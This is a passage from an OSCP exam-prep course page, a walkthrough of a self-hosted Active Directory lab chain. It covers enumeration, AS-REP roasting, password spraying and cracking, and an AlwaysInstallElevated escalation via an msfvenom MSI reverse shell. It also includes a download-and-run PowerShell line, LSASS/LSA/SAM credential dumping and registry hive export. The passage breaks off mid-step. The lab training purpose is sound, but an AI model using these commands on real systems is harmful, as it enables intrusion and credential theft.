  
OSCP® Exam Prep CourseActive Directory Chains

Lesson 35 of 97

Completed

Start here8/8

Active Directory24/24

Active Directory Chains15/15

Chain 01: First ContactBuild a solid foundation for attacking Active Directory environments.Chain 02: StolenDevelop reliable credential access and lateral movement techniques.Chain 03: BleedWideExpand domain access through coordinated AD attacks and spraying.Chain 04: Inside JobLeverage pivoting to reach vulnerable services inside AD networks.Chain 05: GroupThinkPerform network pivoting and abuse misconfigured Group Policies to extend and maintain control.Chain 06: TrustfallShape misconfigurations and open services into borrowed authority.Chain 07: CrosslinkAbuse trusted access, traverse isolated networks, and escalate across hidden infrastructure.Chain 08: RicochetAbuse injectable endpoints, bypass their defense, and relay it across the domain to seize control.Chain 09: BloodhuntMap the hidden edges, and abuse what others overlook. Only the certified will be let through.Chain 10: ReplicantFollow the unseen edges, migrate into a living process, and make the controller surrender every secret.Chain 11: Cold StorageEscalate through a task, comb the host for credentials, and crack any encryption in your way.Chain 12: DelegateRun as the account left in the open, crack what the cache remembers, then delegate the rights to domain compromise.Chain 13: FailsafeDecrypt a GPP password, crack two vaults, and ride a WriteDacl edge to Domain Admin.Chain 14: Open RelayLeak a credential from SNMP, seize the Spooler for SYSTEM, then relay and reset your way to the domain.Chain 15: OverwriteHop a SQL linked server, loot LSA secrets twice, and reset an account to own the domain.

Initial Access17/17

Privilege Escalation15/15

Pivoting and Tunneling6/6

The Exam5/5

Notes and extras7/7

Lab

AD Chain_03

A domain controller and two Windows clients. Runs on your own machine.

[Download free](https://buymeacoffee.com/hackacademy/e/476963)[About this chain](https://hackerblueprint.com/labs#chain-03)[All chains bundle](https://buymeacoffee.com/hackacademy/e/582690)

Not startedStartedRooted

Wrote a walkthrough?

We'd love to see how you took this chain! Written up or on video, both are great. Email it to us and we'll take a look.

[Email your walkthrough](mailto:hacking.academy@protonmail.com?subject=Walkthrough%3A%20Chain%2003%3A%20BleedWide)

Tags

SMB EnumerationPort ScanningAD EnumerationAS-REP RoastingLDAP EnumerationPassword CrackingPassword ReuseWindows Privesc

PreviousCompletedNext: Chain 04: Inside JobContinue

Chat  
and notesHelp[Ideas](https://discord.com/channels/1325919248954167468/1325966774881226862)

## Chain 03: BleedWide

18 steps

Close

0:00 / 48:51

Auto

1

Read the brief and sweep the subnet

BackNext step

Your lab addressesYour IPOur subnetDC01 IPCLIENT-1 IPCLIENT-2 IP

1. 1Read the brief and sweep the subnet_0:04_
    
    The lab gives us a working folder with one file in it: a username and password for the domain. We read it, check where our own machine sits, then sweep the subnet for hosts that answer on SMB. Three machines reply as part of `hack-academy.local`, and a fourth answers with its own workgroup name, so we leave it alone.
    
    Kali
    
    ```
    cd AD_CHAIN_3
    ```
    
    Copy
    
    Changes into the chain's working folder. The brief, the target list and every file we write later live here.
    
    **Why**Keeping one folder per chain means the notes and payloads are where the next step expects them.
    
    Kali
    
    ```
    cat starting_creds.txt
    ```
    
    Copy
    
    Prints the starting credential, `lfoster:Pindrop#1`.
    
    **Why**This single domain account is the whole starting position, so every later step is built on it.
    
    Kali
    
    ```
    route
    ```
    
    Copy
    
    Prints the routing table: our default gateway and the interface we reach the lab through.
    
    **Why**Knowing our own network is what lets us read the sweep results and tell the lab hosts from the internet.
    
    Kali
    
    ```
    netexec smb 10.0.2.0/24
    ```
    
    Copy
    
    Sweeps the subnet for SMB. Each reply shows the host name, the domain or workgroup, and the Windows build.
    
    **Why**In an Active Directory lab the domain-joined machines answer on 445, so one sweep finds the chain and names the domain.
    
    **Tip**The sweep output also gives us the domain name, `hack-academy.local`, which every later command needs. Writing it down here saves a second sweep.
    
2. 2Scan the hosts and start BloodHound_1:36_
    
    The three domain hosts go into a file called `ips` so the same list can be reused for every sweep and spray. A full port scan then runs from that file and saves to `nmap_ports.txt`.
    
    While the scan runs we set up BloodHound Community Edition. It ships as a Docker Compose stack, so we pull the compose file, start the containers and read the initial password from the container log. The web interface then opens on port 8080.
    
    Kali
    
    ```
    gedit ips
    ```
    
    Copy
    
    Opens a file called `ips` and we type the three domain hosts, `DC_IP`, `CLIENT1_IP` and `CLIENT2_IP`, one per line.
    
    **Why**A file of targets means the same scan and the same sprays can be repeated against a changed list without retyping addresses.
    
    Kali
    
    ```
    netexec smb ips
    ```
    
    Copy
    
    Repeats the SMB sweep from the file and prints the three hosts in the order they are listed.
    
    **Why**We check the file before spending a full port scan on it, because a typo in an address would look like a host that is down.
    
    Kali
    
    ```
    nmap -p- -Pn -iL ips -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt --open
    ```
    
    Copy
    
    Scans all 65535 TCP ports on every host in the file. `-iL` reads the list, `-Pn` skips host discovery, `--min-rate 1000` keeps at least 1000 packets in flight, and `--open` prints only open ports. The results go to `nmap_ports.txt`.
    
    **Why**Everything after this is chosen from what is listening, so the scan has to be complete rather than a shortlist of common ports.
    
    Kali
    
    ```
    curl -L https://ghst.ly/getbhce -o docker-compose.yml
    ```
    
    Copy
    
    Downloads the BloodHound Community Edition compose file and saves it as `docker-compose.yml`.
    
    **Why**The compose file pins the images and the ports, so the stack starts the same way on any machine.
    
    Kali
    
    ```
    docker-compose pull && docker-compose up -d
    ```
    
    Copy
    
    Pulls the three images and starts the six containers in the background. The log shows the network and the two volumes being created, then each container starting.
    
    **Why**`-d` leaves the stack running so the terminal is free for the collection later.
    
    Kali
    
    ```
    docker-compose logs bloodhound | grep -i passw
    ```
    
    Copy
    
    Reads the application container's log and filters for the password line. It prints `Initial Password Set To:` followed by a random string.
    
    **Why**Community Edition generates the first administrator password itself, so this is the only place to get it.
    
    **Tip**The login page is `http://localhost:8080/`, which redirects to `/ui/login`. The account is `admin` and the password is the one from the log line. The first login forces a password change, so the initial password is used once.
    
3. 3Log in to BloodHound and collect the domain_3:08_
    
    With the stack running we open `localhost:8080/` in Firefox. It redirects to `/ui/login`, where the account is `admin` and the password is the one printed in the container log. The first login forces a password change, and the new password is ours to choose. The Explore page then loads empty, which is expected: nothing has been collected yet.
    
    We go back to the terminal and run the collection. It asks the domain controller over LDAP for the full set of objects and relationships and writes the result as a zip. The zip lands in the netexec log folder, so we copy it to `/tmp` where the browser's file picker can reach it.
    
    Kali
    
    ```
    cat starting_creds.txt
    ```
    
    Copy
    
    Prints the starting credential again, so the user name and the password can be copied into the collection command without retyping them.
    
    **Why**The collection needs a valid domain account. Re-reading the file avoids a typo in the password, which would make the bind fail and waste the run.
    
    Kali
    
    ```
    netexec smb ips
    ```
    
    Copy
    
    Prints the three hosts from the target file, so the domain controller's address can be copied into the collection command.
    
    **Why**The collection runs against the DC only. Reading the address from the file is quicker than remembering it and keeps the whole chain on one target list.
    
    Kali
    
    ```
    netexec ldap 10.0.2.4 -u lfoster -p 'Pindrop#1' --bloodhound --collection All --dns-server 10.0.2.4
    ```
    
    Copy
    
    Binds to LDAP on the domain controller as `lfoster` and collects the domain with the BloodHound module. `--collection All` takes every collection method and `--dns-server` points name resolution at the DC.
    
    **Why**This is the collection step that gives BloodHound its graph. Running it as the low-privilege user we already hold means no administrator rights are needed to map the domain.
    
    Kali
    
    ```
    cp /root/.nxc/logs/DC01_DC_IP_2025-09-04_141151_bloodhound.zip /tmp
    ```
    
    Copy
    
    Copies the collection zip from the netexec log folder to `/tmp`. The name carries the host, the address and the time of the run.
    
    **Why**The browser upload needs a path the file picker can open. `/tmp` is short and always reachable, and the name is the one netexec just wrote.
    
    **Tip**The collection finishes with a line naming the zip it wrote. The timestamp in that name is the run time, so the copy command has to be built from the name on screen rather than from the one shown here.
    
4. 4Read the users and the shares, then read the graph_5:28_
    
    In the browser we open Administration and then File Ingest. The page offers an Upload File(s) button. We click it, choose the zip in `/tmp`, and start the ingest. The row reads Ingesting, then Analyzing, then Complete, and Explore now has a populated graph.
    
    Back on Kali we ask the domain controller for the user list. The output names 23 accounts. We keep only the account names and save them to a file called `users`, because that list is the input for the roast and the spray. Nothing in the description fields looks like a password.
    
    We also check the SMB shares on the DC. Only the default administrative shares answer, so there is no open share to read. The way in has to come from the domain data.
    
    In Explore we then read the graph. The Domain Admins query returns `AMORALES` and `ADMINISTRATOR`, so `amorales` is the account to aim for. The DCSync and AllExtendedRights query returns only the default groups. The AS-REP roastable query returns one node, `ADIAZ`, which means that account has Kerberos pre-authentication turned off. The Kerberoastable query with admin privileges returns nothing. The shortest-path queries from the owned node return nothing either, because `lfoster` has no path of its own.
    
    Kali
    
    ```
    netexec ldap 10.0.2.4 -u lfoster -p 'Pindrop#1' --users
    ```
    
    Copy
    
    Lists the domain users over LDAP. Each row shows the account name, the last password change and the bad password count, and the description is printed when it is set.
    
    **Why**A user list is the input for AS-REP roasting and for the password spray. Asking LDAP as a normal domain user is quieter than enumerating over SMB.
    
    Kali
    
    ```
    netexec ldap 10.0.2.4 -u lfoster -p 'Pindrop#1' --users | fgrep -v '[' | fgrep -vi '-Username-' | awk '{print$ 5}' | tee users
    ```
    
    Copy
    
    Repeats the listing and keeps only the account names: `fgrep -v` drops the summary and header lines, `awk` prints the fifth field, and `tee` writes the result to `users` while still showing it.
    
    **Why**The raw table is hard to feed to other tools. One name per line is what the roast and the spray expect, and writing it to a file captures the list once.
    
    Kali
    
    ```
    cat users
    ```
    
    Copy
    
    Prints the saved name list, one account per line, so the file can be checked before it is used.
    
    **Why**A filter that takes the wrong column would silently produce garbage. Reading the file back is the cheapest way to confirm the list is clean.
    
    Kali
    
    ```
    netexec smb 10.0.2.4 -u lfoster -p 'Pindrop#1' --shares
    ```
    
    Copy
    
    Lists the SMB shares on the domain controller and the access level the account has on each one.
    
    **Why**Before spending time on LDAP objects we check the obvious file-share surface. Only the default shares answer, so the way in has to come from the domain data.
    
    **Tip**`netexec ldap ... --shares` is a common slip: the share listing belongs to the SMB protocol, not LDAP. If the command rejects the flag, switch the protocol to `smb`.
    
5. 5Roast the AS-REP hash_8:36_
    
    The graph named `adiaz` as an account with pre-authentication disabled. We ask the domain controller for that account's AS-REP and save the result. The request needs no password, because the whole point of the misconfiguration is that the DC answers before checking who is asking.
    
    Impacket does the whole user list in one pass and writes the hash to `hashes.txt`. We then repeat the roast with netexec, which prints the hash and saves it to a file called `hash`. The netexec form needs the DNS server set, because the domain name has to resolve to the DC. The first try without that flag fails on name resolution, which is the mistake worth remembering.
    
    We read the saved hash, list the folder to see what the runs left behind, and delete the impacket copy so only one hash file remains.
    
    Kali
    
    ```
    impacket-GetNPUsers hack-academy.local/ -dc-ip 10.0.2.4 -usersfile users -outputfile hashes.txt
    ```
    
    Copy
    
    Requests the AS-REP for every account in the `users` file and writes the hashes to `hashes.txt`. Accounts that still require pre-authentication are skipped with a message.
    
    **Why**Impacket walks the whole list in one request and needs no valid credential, so it turns the BloodHound finding into a hash without a password.
    
    Kali
    
    ```
    netexec ldap 10.0.2.4 -u users -p '' -k --dns-server 10.0.2.4
    ```
    
    Copy
    
    Runs the same roast over LDAP with the user name taken from the file, an empty password and Kerberos enabled. `--dns-server` makes the domain name resolve to the DC.
    
    **Why**The second tool confirms the finding and shows the netexec form. `--dns-server` is the flag that fixes the resolution failure the first attempt hit.
    
    Kali
    
    ```
    netexec ldap 10.0.2.4 -u users -p '' -k --dns-server 10.0.2.4 --asrep hash
    ```
    
    Copy
    
    Repeats the roast and writes the AS-REP hash to a file called `hash`. The output marks the vulnerable account with a success line naming `adiaz`.
    
    **Why**The file is what John reads next. Keeping the hash in a file also means the crack can be re-run without asking the DC again.
    
    Kali
    
    ```
    cat hash
    ```
    
    Copy
    
    Prints the saved AS-REP hash, which starts with `$krb5asrep$23$` and the account name.
    
    **Why**Checking the file before cracking it avoids a wasted John run on an empty or truncated file.
    
    Kali
    
    ```
    ls
    ```
    
    Copy
    
    Lists the working folder: the compose file, the two hash files, the target list, the scan output and the starting credential file.
    
    **Why**Two hash files exist at this point. Seeing both makes it clear which one to keep and which to remove.
    
    Kali
    
    ```
    rm hashes.txt
    ```
    
    Copy
    
    Deletes the impacket copy of the same hash, leaving only the netexec file `hash`.
    
    **Why**One hash file means the next commands cannot pick the wrong one, and the folder stays readable.
    
    **Tip**`--dns-server` is easy to forget. Without it the command tries to resolve the domain through the local resolver and fails with a name resolution error, even though the DC is reachable by address.
    
6. 6Crack the hash and build the password file_9:52_
    
    John reads the AS-REP hash and recognises the format without a flag. It recovers `Peru123.` for `adiaz`. The password ends with a full stop, which is part of the value and easy to drop when copying.
    
    We write the credential into the notes and put the known passwords into a file called `pass`. That file is the input for the spray: one password per line, so netexec can try each one against every account in the user list.
    
    Kali
    
    ```
    john --wordlist=/usr/share/wordlists/rockyou.txt hash
    ```
    
    Copy
    
    Cracks the AS-REP hash in the `hash` file against rockyou. John detects the format from the hash text, so no format flag is needed here.
    
    **Why**The roast gave us a hash that can be attacked offline. Cracking it turns the misconfiguration into a usable password, and the AS-REP format is cheap to attack compared with Kerberos tickets.
    
    Kali
    
    ```
    gedit notes
    ```
    
    Copy
    
    Opens the notes file and records the credential just recovered, `adiaz:Peru123.`, next to the starting account.
    
    **Why**The chain now holds two credentials. Writing each one down as it is found keeps the later sprays and the report honest about where each password came from.
    
    Kali
    
    ```
    gedit pass
    ```
    
    Copy
    
    Opens a file called `pass` and writes the known passwords, one per line: `Peru123.` and `Pindrop#1`.
    
    **Why**netexec takes a password file with `-p pass`. Collecting the passwords in one place means one spray tries every combination without retyping.
    
    **Tip**The password is `Peru123.` with the full stop. Copying only the visible characters loses the last one and the spray fails for that account.
    
7. 7Spray the password file over SMB, WinRM and RDP_11:48_
    
    With two passwords and 23 accounts we can spray safely: the domain lockout policy is not tight enough for a single wrong password per account to matter, and `--continue-on-success` keeps the run going after a hit.
    
    The first command repeats the roast across the whole target list, which confirms the finding on both clients and not just on the DC. The SMB spray then tests both passwords against every account. `adiaz` and `lfoster` both answer on CLIENT-2, which tells us the password file works and gives us a host to aim at.
    
    The WinRM spray returns nothing usable, so the remote shell protocol is closed to these credentials. Before trying RDP we read the port scan to see what the clients actually expose, and the RDP spray then finds the way in.
    
    Kali
    
    ```
    netexec smb ips -u users -p '' -k --dns-server 10.0.2.4 --asrep hash
    ```
    
    Copy
    
    Runs the AS-REP roast over SMB against every host in the target list, with an empty password and Kerberos enabled.
    
    **Why**Repeating the roast across the list confirms the finding is not limited to the DC and shows which client answers, so the later sprays can be aimed at the right host.
    
    Kali
    
    ```
    netexec smb ips -u users -p pass --continue-on-success
    ```
    
    Copy
    
    Sprays both passwords in the `pass` file against every account in the `users` file on every host in `ips`. The flag keeps the run going after a valid login is found.
    
    **Why**A password file plus a user file is the cheapest way to find which accounts share a password. Stopping at the first hit would hide the rest of the matches.
    
    Kali
    
    ```
    netexec winrm ips -u users -p pass --continue-on-success
    ```
    
    Copy
    
    Repeats the same spray against the WinRM service on each host, which is the protocol that gives a remote PowerShell shell.
    
    **Why**A credential that works over SMB does not always work over WinRM, because the service has to be running and the account has to be allowed to log on remotely.
    
    Kali
    
    ```
    cat nmap_ports.txt
    ```
    
    Copy
    
    Prints the saved port scan so the open services on each host can be read without scanning again.
    
    **Why**The scan already recorded which ports answer. Reading the file is faster than a second scan and shows which protocol is worth spraying next.
    
    Kali
    
    ```
    netexec rdp ips -u users -p pass --continue-on-success
    ```
    
    Copy
    
    Sprays the same password file against the RDP service on each host and reports which accounts can open an interactive desktop.
    
    **Why**RDP is the fallback when WinRM is closed. A hit here gives a full desktop, which is often enough to run the local enumeration that finds the escalation path.
    
    **Tip**The spray order matters. SMB first, because it is quiet and confirms the password, then WinRM and RDP, which are noisier and only matter once a credential is known to be valid.
    
8. 8Take the desktop session on CLIENT-2_15:12_
    
    The RDP spray named `adiaz` as a valid desktop login on CLIENT-2. We open the session with FreeRDP and the recovered password. The flags keep the clipboard shared and let the remote desktop resize with the window, and the drive mapping shares the current folder so files can be moved both ways.
    
    Once the Windows desktop is up we have an interactive foothold as a normal domain user. The next step is to find out what that user can do locally, because a domain account with no rights is only useful if the host itself is misconfigured.
    
    Kali
    
    ```
    xfreerdp3 /v:10.0.2.9 /u:adiaz /p:'Peru123.' /cert:ignore +clipboard /dynamic-resolution /drive:.,share
    ```
    
    Copy
    
    Opens an RDP session to CLIENT-2 as `adiaz`. `+clipboard` shares the clipboard, `+dynamic-resolution` resizes the desktop with the window, and `/drive:.,share` exposes the current Kali folder as a share called `share`.
    
    **Why**The desktop is the foothold. The drive mapping means tools and output can be moved between Kali and the target without a second transfer channel.
    
    **Tip**The password contains a full stop, so it has to be quoted on the command line. An unquoted value loses the last character and the login fails with a generic authentication error.
    
9. 9Enumerate the desktop for an escalation path_16:00_
    
    On the CLIENT-2 desktop we open PowerShell and check who we are. `whoami /all` shows a plain domain user in the Remote Desktop Users group with no useful privileges enabled, so the way up has to come from a misconfiguration on the host.
    
    PowerUp runs its full set of checks in memory. It reports modifiable service binaries for the Edge updater, a DLL hijack path in the user's WindowsApps folder, and the AlwaysInstallElevated registry key with its abuse function. The first finding looks promising until we read the ACL on the Edge binary: only SYSTEM and Administrators can write to it, so that path is a dead end.
    
    AlwaysInstallElevated is the route worth taking. When both the machine and the user policy keys are set, Windows Installer runs any MSI as SYSTEM, which turns a package we build into a local administrator. We also record the host name and the network configuration, because the payload has to call back to our machine and the addresses must match.
    
    CLIENT-2 (PowerShell)
    
    ```
    whoami /all
    ```
    
    Copy
    
    Prints the account name, the group memberships and the enabled privileges for the session.
    
    **Why**It establishes the starting point before any escalation attempt. A standard user with no privileges means the escalation has to come from a host misconfiguration, not from the account itself.
    
    CLIENT-2 (PowerShell)
    
    ```
    powershell.exe -c "wget -useb https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Privesc/PowerUp.ps1 | iex; Invoke-AllChecks"
    ```
    
    Copy
    
    Downloads PowerUp into memory with `wget` and runs every check. `wget` is the alias for `Invoke-WebRequest` and `-useb` is `-UseBasicParsing`.
    
    **Why**One script covers the common Windows escalation checks, so the findings are collected in a single pass instead of one manual test at a time.
    
    CLIENT-2 (PowerShell)
    
    ```
    get-acl "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe"|fl
    ```
    
    Copy
    
    Prints the access control list of the Edge updater binary in full, one property per line.
    
    **Why**PowerUp flagged the service binary as modifiable. The ACL shows whether the current user can actually write to it, which decides if the finding is usable.
    
    CLIENT-2 (PowerShell)
    
    ```
    hostname
    ```
    
    Copy
    
    Prints the computer name of the host we are sitting on.
    
    **Why**The name is what the reverse shell callbacks and the notes refer to, and it confirms which machine the desktop belongs to.
    
    CLIENT-2 (PowerShell)
    
    ```
    ipconfig
    ```
    
    Copy
    
    Prints the network configuration, including the address the host uses on the lab network.
    
    **Why**The payload has to reach back to our machine, so the host's own address and network are needed to confirm the two machines can see each other.
    
    **Tip**A modifiable service binary is only exploitable if the current user can write to the file. Reading the ACL first is what separates a real finding from a dead end, and the Edge path here is a dead end.
    
10. 10Build the MSI payload and catch the SYSTEM shell_19:00_
    
    The AlwaysInstallElevated keys make Windows Installer run any MSI as SYSTEM, so the payload is a reverse shell packaged as an MSI. The notes page for this technique carries a template with a placeholder address, and that address is not ours. Building the package with it would send the shell to a machine that does not exist, so we first check our own address.
    
    `ip a` shows the lab interface and its address. `msfvenom` then builds the MSI with `LHOST=eth0`, which makes it resolve the interface address at build time instead of hard-coding a value we might get wrong. The package is served from the working folder with Python's HTTP server, and the target pulls it with PowerShell's `wget`.
    
    On the desktop we run the package with `msiexec`. Because both policy keys are set, the installer runs as SYSTEM and the reverse shell calls back. A listener started beforehand catches it. `whoami` inside the new shell confirms SYSTEM, and the first thing we do with that access is add `adiaz` to the local administrators group, so the same account can dump secrets over SMB from Kali.
    
    Kali
    
    ```
    ip a
    ```
    
    Copy
    
    Prints the addresses on every interface, including the lab interface and its address.
    
    **Why**The payload has to call back to a reachable address. Reading it from the interface is the only way to be sure which address the target can reach.
    
    Kali
    
    ```
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=443 -f msi -o reverse.msi
    ```
    
    Copy
    
    Builds a 64-bit reverse shell as an MSI package. `LHOST=eth0` lets msfvenom resolve the interface address, `LPORT=443` is the callback port and `-o` names the output file.
    
    **Why**The MSI format is what AlwaysInstallElevated abuses. Using the interface name instead of a typed address avoids the template's stale address, which points at a machine that is not ours.
    
    Kali
    
    ```
    python3 -m http.server 80
    ```
    
    Copy
    
    Serves the working folder over HTTP on port 80, so the target can download the package.
    
    **Why**The desktop needs a way to pull the file. An HTTP server needs no extra tooling on the target and leaves the request in the terminal as confirmation.
    
    CLIENT-2 (PowerShell)
    
    ```
    wget -useb 10.0.2.11/reverse.msi -o reverse.msi
    ```
    
    Copy
    
    Downloads the package from our HTTP server to the desktop. `wget` is the alias for `Invoke-WebRequest`, `-useb` is `-UseBasicParsing` and `-o` is `-OutFile`.
    
    **Why**The target cannot reach the Kali folder directly, so the package is pulled over HTTP. PowerShell's own downloader means no extra tool has to be uploaded first.
    
    CLIENT-2 (PowerShell)
    
    ```
    whoami
    ```
    
    Copy
    
    Prints the account the current PowerShell session runs as.
    
    **Why**It confirms the session is still the standard user before the installer runs, which is what makes the SYSTEM shell afterwards meaningful.
    
    Kali
    
    ```
    rlwrap nc -lvnp 443
    ```
    
    Copy
    
    Starts a listener on port 443 with `rlwrap` wrapped around it, so the raw shell gets line editing and history.
    
    **Why**The listener has to be running before the package executes, or the callback arrives at a closed port and the shell is lost.
    
    CLIENT-2 (SYSTEM shell)
    
    ```
    whoami
    ```
    
    Copy
    
    Prints the account the new shell runs as, which is `nt authority\system`.
    
    **Why**The privilege level is the whole result of the escalation. Confirming SYSTEM shows the policy keys did what the technique promises.
    
    CLIENT-2 (SYSTEM shell)
    
    ```
    net localgroup "administrators" adiaz /add
    ```
    
    Copy
    
    Adds the domain account `adiaz` to the local administrators group on CLIENT-2.
    
    **Why**SYSTEM access is a shell on the desktop. Adding the domain account means the same credential can dump secrets over SMB from Kali, which is easier to work with than a raw shell.
    
    **Tip**The installer is run on the desktop with `msiexec /quiet /i` on the downloaded package. The command is typed in the desktop session, so it does not appear in the terminal history that this guide follows.
    
11. 11Dump the local hashes and cached credentials_22:28_
    
    `adiaz` is now a local administrator on CLIENT-2, so netexec can read the machine's secrets over SMB. The first command confirms the account is valid across the whole target list and shows where the administrator rights now apply.
    
    The SAM dump gives the local account hashes. The user listing shows the domain accounts the machine knows. The two LSASS modules, `nanodump` and `lsassy`, both try to read credential material from memory, and the LSASS dump then reads the registry secrets directly.
    
    The `--lsa` output is the one that matters: it holds the cached domain credentials as mscash2 hashes. We filter those lines out into a file and crack them with John, which recovers the password of `jbailey`. That password is the next credential in the chain, and it belongs to an account with rights on the member server.
    
    Kali
    
    ```
    netexec smb ips -u adiaz -p 'Peru123.'
    ```
    
    Copy
    
    Checks the credential against every host in the target list and prints which hosts accept it.
    
    **Why**The local administrator add only affects CLIENT-2. Running against the whole list shows the real scope of the new access before anything is dumped.
    
    Kali
    
    ```
    netexec smb 10.0.2.9 -u adiaz -p 'Peru123.' --sam
    ```
    
    Copy
    
    Dumps the local SAM database from CLIENT-2 and prints each local account with its RID and NT hash.
    
    **Why**The SAM holds the local account hashes. Those hashes are usable for pass-the-hash on the host even when the password cannot be cracked.
    
    Kali
    
    ```
    netexec smb 10.0.2.9 -u adiaz -p 'Peru123.' --users
    ```
    
    Copy
    
    Lists the domain users the host knows about, with their last logon and password age.
    
    **Why**The listing shows which accounts are active on the machine. Accounts that log on locally are the ones whose credentials end up in the cache.
    
    Kali
    
    ```
    netexec smb 10.0.2.9 -u adiaz -p 'Peru123.' -M nanodump
    ```
    
    Copy
    
    Runs the nanodump module, which reads the LSASS process memory and extracts credential material from it.
    
    **Why**LSASS holds credentials of logged-on users. Dumping it is the standard way to recover domain passwords from a host where an administrator session exists.
    
    Kali
    
    ```
    netexec smb 10.0.2.9 -u adiaz -p 'Peru123.' -M lsassy
    ```
    
    Copy
    
    Runs the lsassy module, which reads LSASS memory with a different technique and parses the credentials it finds.
    
    **Why**Two dump methods are tried because either one can be blocked by endpoint protection or by the build of the host. The second attempt is a fallback, not a repeat.
    
    Kali
    
    ```
    netexec smb 10.0.2.9 -u adiaz -p 'Peru123.' --lsa
    ```
    
    Copy
    
    Dumps the LSA secrets from the registry, including the cached domain credentials stored as mscash2 hashes.
    
    **Why**The cached credentials are the passwords of domain users who logged on to this host. They can be cracked offline, which turns a local administrator on a client into a domain credential.
    
    Kali
    
    ```
    netexec smb 10.0.2.9 -u adiaz -p 'Peru123.' --lsa | awk '{print $5}' | fgrep '/' | tee mscash_hashes
    ```
    
    Copy
    
    Repeats the LSA dump and keeps only the cached-credential lines. `awk` takes the fifth field, `fgrep '/'` keeps the lines that carry a domain and user, and `tee` saves them to `mscash_hashes`.
    
    **Why**The raw dump is wide and hard to feed to John. One hash per line in a named file is what the cracker needs, and the filter drops the machine account and the plain secrets.
    
    Kali
    
    ```
    john --wordlist=/usr/share/wordlists/rockyou.txt --format=mscash2 mscash_hashes
    ```
    
    Copy
    
    Cracks the cached hashes with the rockyou wordlist. The format is stated explicitly because mscash2 hashes are easy to confuse with other Microsoft formats.
    
    **Why**The recovered passwords are domain credentials. `jbailey` comes out of this run, and that account has rights on the member server the next steps move to.
    
    **Tip**The mscash2 format is slow to attack, so a long wordlist run is normal. The `--format` flag is worth stating even when John detects the hash, because a wrong guess wastes the whole run.
    
12. 12Clean up the admin add and spray the new password_26:44_
    
    The dump is finished, so the local administrator membership we added for it is no longer needed. Removing it keeps the host in its original state and means the access we hold is the credential, not a lingering group change.
    
    We confirm the removal took effect, then spray the newly cracked password. The first spray tests `Peru123.` against the user list, which is a repeat of the earlier run with the same result. The second tests `Paulio*3`, and that one is the interesting run: `jbailey` answers on both SMB and RDP, and the WinRM spray reports a hit on CLIENT-1.
    
    A WinRM hit with execution rights is a shell on the member server. That is the pivot away from the desktop and onto the machine where the backup operator privileges sit.
    
    Kali
    
    ```
    netexec smb 10.0.2.9 -u adiaz -p 'Peru123.' -X 'net localgroup administrators adiaz /del'
    ```
    
    Copy
    
    Runs a command on CLIENT-2 over SMB that removes `adiaz` from the local administrators group.
    
    **Why**The membership was added only to allow the dump. Removing it afterwards is basic hygiene and leaves the host as it was found.
    
    Kali
    
    ```
    netexec smb 10.0.2.9 -u adiaz -p 'Peru123.'
    ```
    
    Copy
    
    Checks the same credential again and shows the access level the account now has.
    
    **Why**The output no longer reports administrative rights, which confirms the removal worked and the account is back to a plain user.
    
    Kali
    
    ```
    netexec smb ips -u users -p 'Peru123.'
    ```
    
    Copy
    
    Sprays the first known password against every account in the user list across the whole target list.
    
    **Why**Repeating the spray after the password change confirms the credential set is stable and shows whether the earlier hits still answer.
    
    Kali
    
    ```
    netexec smb ips -u users -p 'Paulio*3'
    ```
    
    Copy
    
    Sprays the password cracked from the cached credentials against every account in the user list.
    
    **Why**A password recovered from one host is often reused elsewhere. This run is what turns the local cache crack into a domain-wide credential.
    
    Kali
    
    ```
    netexec rdp ips -u users -p 'Paulio*3'
    ```
    
    Copy
    
    Repeats the spray against RDP on every host and reports which accounts can open a desktop.
    
    **Why**RDP access is a separate permission from SMB access. A hit here gives an interactive session on a host where the SMB rights may not be enough.
    
    Kali
    
    ```
    netexec winrm ips -u users -p 'Paulio*3'
    ```
    
    Copy
    
    Repeats the spray against WinRM and reports which accounts have execution rights, shown by the Pwn3d marker.
    
    **Why**WinRM with execution rights gives a remote shell. That is the cleanest way onto the member server and the pivot the rest of the chain uses.
    
    **Tip**The Pwn3d marker in netexec means the account has administrator rights on that host, not just a valid login. Only those hits are worth opening a shell with.
    
13. 13Take the WinRM shell on CLIENT-1_29:56_
    
    The WinRM spray reported `jbailey` with execution rights on CLIENT-1. We open an evil-winrm session as that account and land in the user's Documents folder.
    
    `whoami /all` shows the account belongs to Backup Operators and holds `SeBackupPrivilege` and `SeRestorePrivilege`. That combination is the escalation: a backup operator can read files that the normal access checks would deny, including the registry hives that hold the local password hashes.
    
    Kali
    
    ```
    evil-winrm -i 10.0.2.7 -u jbailey -p 'Paulio*3'
    ```
    
    Copy
    
    Opens a WinRM shell on CLIENT-1 as `jbailey` and lands in the user's Documents folder.
    
    **Why**The spray already proved the account has execution rights on this host. A WinRM shell is the interactive access the hive export needs.
    
    CLIENT-1 (evil-winrm shell)
    
    ```
    whoami /all
    ```
    
    Copy
    
    Prints the account, its group memberships and its privileges. The output shows Backup Operators and the backup and restore privileges enabled.
    
    **Why**The group membership is what makes the next step possible. Checking it first confirms the account can read the hives without being a local administrator.
    
    **Tip**Backup Operators is a quietly powerful group. The backup privilege bypasses the normal file access checks, so an account in that group can read the registry hives even though it is not an administrator.
    
14. 14Export the SAM and SYSTEM hives_31:12_
    
    The backup privilege lets us read the registry hives even though the account is not a local administrator. `reg save` writes a copy of a hive to a file, and the backup privilege is what allows the copy to succeed on a protected key.
    
    We save the SYSTEM hive first and the SAM hive second, both into `C:\Windows\Tasks`, which is a folder the account can write to. Then we list the folder to confirm both files are there with their sizes.
    
    With the files in place we pull them back to Kali with evil-winrm's own `download` command, which needs no web server or listener on the target side. Once both are local, the shell is no longer needed and we exit.
    
    CLIENT-1 (evil-winrm shell)
    
    ```
    reg save hklm\system c:\windows\tasks\system
    ```
    
    Copy
    
    Writes a copy of the SYSTEM registry hive to `C:\Windows\Tasks\system`.
    
    **Why**The SYSTEM hive holds the boot key that decrypts the SAM. Without it the SAM hashes cannot be recovered, so this file is half of the pair.
    
    CLIENT-1 (evil-winrm shell)
    
    ```
    reg save hklm\sam c:\windows\tasks\sam
    ```
    
    Copy
    
    Writes a copy of the SAM registry hive to `C:\Windows\Tasks\sam`.
    
    **Why**The SAM holds the local account hashes. Saving it into the same folder as the SYSTEM hive means both files can be collected in one visit.
    
    CLIENT-1 (evil-winrm shell)
    
    ```
    cd c:\windows\tasks; ls
